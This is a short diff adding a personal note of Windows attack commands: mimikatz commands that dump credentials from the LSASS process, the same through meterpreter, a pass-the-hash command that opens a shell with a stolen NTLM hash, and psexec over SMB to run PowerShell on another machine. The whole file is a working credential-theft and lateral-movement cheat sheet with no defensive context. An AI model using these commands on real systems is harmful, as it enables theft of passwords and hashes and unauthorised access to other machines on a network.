@@ -1,0 +1,14 @@
+can Use this to dunp Content Of Lssas Process And ... 
+
+Commands: (Check Github Mimikatz For New Future)
+	mimikatz as .exe and modular in meterpreter
+	
+	privilege::debug
+	sekurlsa::logonpasswords
+
+	meterpreter > load mimikatz
+	meterpreter > mimikatz_command -f sekurlsa::logonpasswords
+
+	mimikatz # sekurlsa::pth /user:<User> /domain:<Domain> /ntlm:<NTLM Hash> /run:cmd
+
+	psexec -i \\<Other machine's IP address> powershell   | Used Port 445 (smb) Connect to IP And Run Command From SMB (If Port Close Doesn't Work)
